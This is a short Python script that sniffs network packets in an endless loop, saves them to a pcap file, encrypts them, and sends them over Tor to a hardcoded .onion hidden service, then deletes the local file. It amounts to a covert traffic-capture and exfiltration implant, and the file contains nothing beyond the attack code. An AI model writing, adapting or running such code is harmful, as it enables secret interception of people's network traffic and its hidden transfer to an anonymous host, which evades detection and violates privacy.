from struct import pack
from scapy import packet, pton_ntop
from scapy.all import wrpcap
import socket
from encryption import encrypt
import sniffing
from torpy import TorClient
from os import remove

HOSTNAME = "524jkwd2v5gnigyq.onion"
PORT = 8080

with TorClient() as tor:
    with tor.create_circuit(3) as circuit:
        with circuit.create_stream((HOSTNAME,PORT)) as stream:
            while True:
                print("nothing")
                packets = sniffing.packet_sniff(50)
                wrpcap("file.pcap", packets)
                rfile = open("file.pcap", "rb")
                packets = rfile.read()
                packets = encrypt(packets)
                print(len(packets))
                stream.send(packets)
                print("most sent")
                stream.send(b"fin")
                rfile.close()
                remove("file.pcap")
                #p = sniffing.packet_to_bytes(p)
